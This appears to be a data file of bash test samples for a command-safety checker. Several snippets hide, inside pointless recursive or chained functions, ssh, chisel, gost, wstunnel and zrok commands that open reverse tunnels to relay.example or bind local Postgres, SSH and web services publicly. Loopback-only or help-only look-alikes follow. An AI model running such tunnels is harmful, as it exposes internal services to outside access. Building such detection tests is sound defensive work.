command:
forward_at_base() {
  if (( $1 > 0 )); then forward_at_base "$(( $1 - 1 ))"; else
    ssh -F /dev/null -NT -R 0.0.0.0:15432:127.0.0.1:5432 operator@relay.example
  fi
}
forward_at_base 2

step_a() { if (( $1 > 0 )); then step_b "$(( $1 - 1 ))"; else chisel client https://relay.example:8443 R:socks; fi; }
step_b() { step_a "$1"; }
step_a 2

relay_ssh() {
  if (( $1 )); then relay_ssh "$(( $1 - 1 ))"; else
    gost -L=tcp://0.0.0.0:2222/127.0.0.1:22
  fi
}
relay_ssh 2

start_route() { next_route; }
next_route() { wstunnel client -R 'tcp://0.0.0.0:2222:127.0.0.1:22' wss://relay.example:8443; }
start_route

outer() { inner; }
inner() { zrok share public http://127.0.0.1:8080; }
outer

forward_at_base() {
  if (( $1 > 0 )); then forward_at_base "$(( $1 - 1 ))"; else
    ssh -F /dev/null -NT -L 127.0.0.1:15432:127.0.0.1:5432 developer@127.0.0.1
  fi
}
forward_at_base 2

step_a() { if (( $1 > 0 )); then step_b "$(( $1 - 1 ))"; else chisel client http://127.0.0.1:18443 R:127.0.0.1:1080:socks; fi; }
step_b() { step_a "$1"; }
step_a 2

relay_ssh() {
  if (( $1 )); then relay_ssh "$(( $1 - 1 ))"; else
    gost -L=tcp://127.0.0.1:2222/127.0.0.1:22
  fi
}
relay_ssh 2

outer() { inner; }
inner() { zrok share public http://127.0.0.1:8080 --help; }
outer
